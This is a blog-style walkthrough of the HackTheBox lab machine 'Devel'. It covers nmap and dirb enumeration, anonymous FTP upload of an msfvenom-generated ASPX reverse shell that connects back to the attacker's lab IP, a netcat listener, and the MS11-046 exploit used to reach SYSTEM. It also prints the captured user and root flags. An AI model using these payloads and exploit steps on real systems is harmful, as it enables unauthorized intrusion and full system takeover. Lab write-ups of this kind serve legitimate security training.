---
layout: post
title: "Devel Writeup - HackTheBox"
category: HackTheBox
---

## HTB - Devel
Welcome back again, new day new box. Lets do a windows box again, devel is an easy/medium box.

### ENUM
Lets enumerate this target:
```
root@kali:/home/kali/Desktop/HTB/machines/devel# nmap -A 10.129.98.151 | tee firstnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 06:45 EST
Nmap scan report for 10.129.98.151
Host is up (0.015s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   14.83 ms 10.10.14.1
2   14.91 ms 10.129.98.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.17 seconds

```

and some dirbuster:

```
root@kali:/home/kali/Desktop/HTB/machines/devel# dirb http://10.129.98.151

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb 16 08:57:21 2021
URL_BASE: http://10.129.98.151/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.98.151/ ----
==> DIRECTORY: http://10.129.98.151/aspnet_client/                                                                    
                                                                                                                      
---- Entering directory: http://10.129.98.151/aspnet_client/ ----
==> DIRECTORY: http://10.129.98.151/aspnet_client/system_web/                                                         
                                                                                                                      
---- Entering directory: http://10.129.98.151/aspnet_client/system_web/ ----
                                                                                                                      
-----------------
END_TIME: Tue Feb 16 09:01:00 2021
DOWNLOADED: 13836 - FOUND: 0
root@kali:/home/kali/Desktop/HTB/machines/devel# 


```



```
root@kali:/home/kali/Desktop/HTB/machines/devel# nmap -sS -sV --script=vuln 10.129.98.151 | tee secondnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 07:00 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.98.151
Host is up (0.016s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
|_sslv2-drown: 
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-IIS/7.5
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:microsoft:internet_information_server:7.5: 
|     	SSV:12476	9.3	https://vulners.com/seebug/SSV:12476	*EXPLOIT*
|     	SSV:12175	9.3	https://vulners.com/seebug/SSV:12175	*EXPLOIT*
|     	SAINT:38542AFE78DE33F6BB0AF7E6A3C90956	9.3	https://vulners.com/saint/SAINT:38542AFE78DE33F6BB0AF7E6A3C90956	*EXPLOIT*
|     	PACKETSTORM:94532	9.3	https://vulners.com/packetstorm/PACKETSTORM:94532	*EXPLOIT*
|     	MSF:EXPLOIT/WINDOWS/FTP/MS09_053_FTPD_NLST	9.3	https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/FTP/MS09_053_FTPD_NLST	*EXPLOIT*
|     	EDB-ID:9559	9.3	https://vulners.com/exploitdb/EDB-ID:9559	*EXPLOIT*
|     	EDB-ID:9541	9.3	https://vulners.com/exploitdb/EDB-ID:9541	*EXPLOIT*
|     	EDB-ID:16740	9.3	https://vulners.com/exploitdb/EDB-ID:16740	*EXPLOIT*
|     	SAINT:54344E071A068774A374DCE7F7795E80	9.0	https://vulners.com/saint/SAINT:54344E071A068774A374DCE7F7795E80	*EXPLOIT*
|     	SAINT:4EB4CF34422D02BCBF715C4ACFAC8C99	9.0	https://vulners.com/saint/SAINT:4EB4CF34422D02BCBF715C4ACFAC8C99	*EXPLOIT*
|     	IISFTP_NLST	9.0	https://vulners.com/canvas/IISFTP_NLST	*EXPLOIT*
|     	CVE-2009-3023	9.0	https://vulners.com/cve/CVE-2009-3023
|_    	CVE-2010-1256	8.5	https://vulners.com/cve/CVE-2010-1256
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.53 seconds

```

Namely this last bit gave me enough hope to decide to go on to exploitation.

### Find the exploit 🔍

Basicly I started google-ing by the following keyword combinations:

- softwarename + softwareversion + exploit
- softwarename + softwareversion + exploit + github
- softwarename + softwareversion + github
- softwarename + softwareversion + exploitdb
- softwarename + softwareversion + exploit + exploitdb
- softwarename + softwareversion
- I also tried to utilize searchsploit, a tool that basicly is a CLI version of exploitDB.
- And I used the exploits that I got from nmap during enum


#### Microsoft ftpd
- Anon login is enabled, lets see what rights I have if I do login as anon

#### Microsoft IIS httpd 7.5
- SSV:12476	9.3	https://vulners.com/seebug/SSV:12476	*EXPLOIT*
- SSV:12175	9.3	https://vulners.com/seebug/SSV:12175	*EXPLOIT*
- SAINT:38542AFE78DE33F6BB0AF7E6A3C90956	9.3	https://vulners.com/saint/SAINT:38542AFE78DE33F6BB0AF7E6A3C90956	*EXPLOIT*
- PACKETSTORM:94532	9.3	https://vulners.com/packetstorm/PACKETSTORM:94532	*EXPLOIT*
- MSF:EXPLOIT/WINDOWS/FTP/MS09_053_FTPD_NLST	9.3	https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/FTP/MS09_053_FTPD_NLST	*EXPLOIT*
- EDB-ID:9559	9.3	https://vulners.com/exploitdb/EDB-ID:9559	*EXPLOIT*
- EDB-ID:9541	9.3	https://vulners.com/exploitdb/EDB-ID:9541	*EXPLOIT*
- EDB-ID:16740	9.3	https://vulners.com/exploitdb/EDB-ID:16740	*EXPLOIT*
- SAINT:54344E071A068774A374DCE7F7795E80	9.0	https://vulners.com/saint/SAINT:54344E071A068774A374DCE7F7795E80	*EXPLOIT*
- SAINT:4EB4CF34422D02BCBF715C4ACFAC8C99	9.0	https://vulners.com/saint/SAINT:4EB4CF34422D02BCBF715C4ACFAC8C99	*EXPLOIT*
- IISFTP_NLST	9.0	https://vulners.com/canvas/IISFTP_NLST	*EXPLOIT*
- CVE-2009-3023	9.0	https://vulners.com/cve/CVE-2009-3023
- CVE-2010-1256	8.5	https://vulners.com/cve/CVE-2010-1256


### Exploitation galore 🔥

Tried to log in as anon user in FTP, no luck there:

```
root@kali:/home/kali/Desktop/HTB/machines/devel# ftp 10.129.98.151 21
Connected to 10.129.98.151.
220 Microsoft FTP Service
Name (10.129.98.151:kali): 
331 Password required for kali.
Password:
530 User cannot log in.
Login failed.
Remote system type is Windows_NT.
ftp> whoami
?Invalid command
ftp> get uid
local: uid remote: uid
530 Please login with USER and PASS.
ftp: bind: Address already in use
ftp> pwd
530 Please login with USER and PASS.
ftp> ls
530 Please login with USER and PASS.
ftp> 
ftp> user
(username) admin
331 Password required for admin.
Password: 
530 User cannot log in.
Login failed.
ftp> ls
530 Please login with USER and PASS.
ftp> dir
530 Please login with USER and PASS.
ftp> pwd
530 Please login with USER and PASS.
ftp> passwd
?Invalid command
ftp> exit
221 Goodbye.
root@kali:/home/kali/Desktop/HTB/machines/devel# 

```

Thats when I realised I actually had to input anonymous as username:
```
root@kali:/home/kali/Desktop/HTB/machines/devel# ftp 10.129.98.166
Connected to 10.129.98.166.
220 Microsoft FTP Service
Name (10.129.98.166:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
02-16-21  04:46PM                 2081 firstnmap.txt
03-17-17  04:37PM                  689 iisstart.htm
02-16-21  04:47PM                 1172 nikto.txt
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> pwd
257 "/" is current directory.

```

Normally I would create a custom payload with msfvenom after this in exe or sh format in order to establish a reverse shell. But since this server is running IIS, asp is the primary way to do so, therefore I made a payload the following way, and transferred it via filezilla as anonymous towards the server:

```
root@kali:/home/kali/Desktop/HTB/machines/devel# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.35 LPORT=4242 -f aspx > reverse.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2755 bytes

```
Start an NC listening shell on port 4242, and ecevute the aspx file via the webbrowser:

```
root@kali:/home/kali/Desktop/HTB/machines/devel# nc -lvp 4242
listening on [any] 4242 ...
10.129.98.166: inverse host lookup failed: Unknown host
connect to [10.10.14.35] from (UNKNOWN) [10.129.98.166] 49178
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

```
We have two other users on this system, babis and Administrator. And we cant view the contents of their home folders. So privilege escalation time. I found [this](https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046) exploit. Execute the exe after you dragged it to the server:

```
C:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\inetpub\wwwroot

16/02/2021  06:13 ��    <DIR>          .
16/02/2021  06:13 ��    <DIR>          ..
18/03/2017  01:06 ��    <DIR>          aspnet_client
16/02/2021  04:46 ��             2.081 firstnmap.txt
17/03/2017  04:37 ��               689 iisstart.htm
16/02/2021  06:13 ��           112.815 MS11-046(1).exe
16/02/2021  04:47 ��             1.172 nikto.txt
16/02/2021  05:25 ��             2.755 reverse.aspx
16/02/2021  05:03 ��            73.802 reverse.exe
17/03/2017  04:37 ��           184.946 welcome.png
16/02/2021  05:59 ��            35.761 winPEAS.bat
               8 File(s)        414.021 bytes
               3 Dir(s)  22.204.616.704 bytes free

c:\inetpub\wwwroot>MS11-046(1).exe
MS11-046(1).exe
'MS11-046' is not recognized as an internal or external command,
operable program or batch file.

c:\inetpub\wwwroot>MS11-046(1).exe
MS11-046(1).exe
'MS11-046' is not recognized as an internal or external command,
operable program or batch file.

c:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\inetpub\wwwroot

16/02/2021  06:49 ��    <DIR>          .
16/02/2021  06:49 ��    <DIR>          ..
18/03/2017  01:06 ��    <DIR>          aspnet_client
16/02/2021  04:46 ��             2.081 firstnmap.txt
17/03/2017  04:37 ��               689 iisstart.htm
16/02/2021  06:13 ��           112.815 MS11-046(1).exe
16/02/2021  06:49 ��           112.815 MS11-046.exe
16/02/2021  04:47 ��             1.172 nikto.txt
16/02/2021  05:25 ��             2.755 reverse.aspx
16/02/2021  05:03 ��            73.802 reverse.exe
17/03/2017  04:37 ��           184.946 welcome.png
16/02/2021  05:59 ��            35.761 winPEAS.bat
               9 File(s)        526.836 bytes
               3 Dir(s)  22.204.502.016 bytes free

c:\inetpub\wwwroot>MS11-046.exe
MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>

```

Victory is mine:
```
c:\>cd Users
cd Users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Users

18/03/2017  01:16 ��    <DIR>          .
18/03/2017  01:16 ��    <DIR>          ..
18/03/2017  01:16 ��    <DIR>          Administrator
17/03/2017  04:17 ��    <DIR>          babis
18/03/2017  01:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  09:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  22.204.485.632 bytes free

c:\Users>cd babis
cd babis

c:\Users\babis>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Users\babis

17/03/2017  04:17 ��    <DIR>          .
17/03/2017  04:17 ��    <DIR>          ..
17/03/2017  04:17 ��    <DIR>          Contacts
18/03/2017  01:14 ��    <DIR>          Desktop
17/03/2017  04:17 ��    <DIR>          Documents
17/03/2017  04:17 ��    <DIR>          Downloads
17/03/2017  04:17 ��    <DIR>          Favorites
17/03/2017  04:17 ��    <DIR>          Links
17/03/2017  04:17 ��    <DIR>          Music
17/03/2017  04:17 ��    <DIR>          Pictures
17/03/2017  04:17 ��    <DIR>          Saved Games
17/03/2017  04:17 ��    <DIR>          Searches
17/03/2017  04:17 ��    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  22.204.485.632 bytes free

c:\Users\babis>cd Desktop
cd Desktop

c:\Users\babis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Users\babis\Desktop

18/03/2017  01:14 ��    <DIR>          .
18/03/2017  01:14 ��    <DIR>          ..
18/03/2017  01:18 ��                32 user.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  22.204.485.632 bytes free

c:\Users\babis\Desktop>type user.txt.txt
type user.txt.txt
9ecdd6a3aedf24b41562fea70f4cb3e8
c:\Users\babis\Desktop>cd ../..
cd ../..

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Users

18/03/2017  01:16 ��    <DIR>          .
18/03/2017  01:16 ��    <DIR>          ..
18/03/2017  01:16 ��    <DIR>          Administrator
17/03/2017  04:17 ��    <DIR>          babis
18/03/2017  01:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  09:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  22.204.485.632 bytes free

c:\Users>cd Administrator
cd Administrator

c:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Users\Administrator

18/03/2017  01:16 ��    <DIR>          .
18/03/2017  01:16 ��    <DIR>          ..
18/03/2017  01:16 ��    <DIR>          Contacts
14/01/2021  11:42 ��    <DIR>          Desktop
18/03/2017  01:16 ��    <DIR>          Documents
18/03/2017  01:16 ��    <DIR>          Downloads
18/03/2017  01:16 ��    <DIR>          Favorites
18/03/2017  01:16 ��    <DIR>          Links
18/03/2017  01:16 ��    <DIR>          Music
18/03/2017  01:16 ��    <DIR>          Pictures
18/03/2017  01:16 ��    <DIR>          Saved Games
18/03/2017  01:16 ��    <DIR>          Searches
18/03/2017  01:16 ��    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  22.204.485.632 bytes free

c:\Users\Administrator>cd Desktop
cd Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Users\Administrator\Desktop

14/01/2021  11:42 ��    <DIR>          .
14/01/2021  11:42 ��    <DIR>          ..
18/03/2017  01:17 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  22.204.485.632 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
e621a0b5041708797c4fc4728bc72b4b
c:\Users\Administrator\Desktop>

```
Devel and Scriptkiddie are the last two boxes I did, and tbh they feel more like OSWE then OSCP boxes, since they focus more on webapps then different fields. But it is nice to have a bit contrast. This box was kinda ez so i'll give it a 4/10.
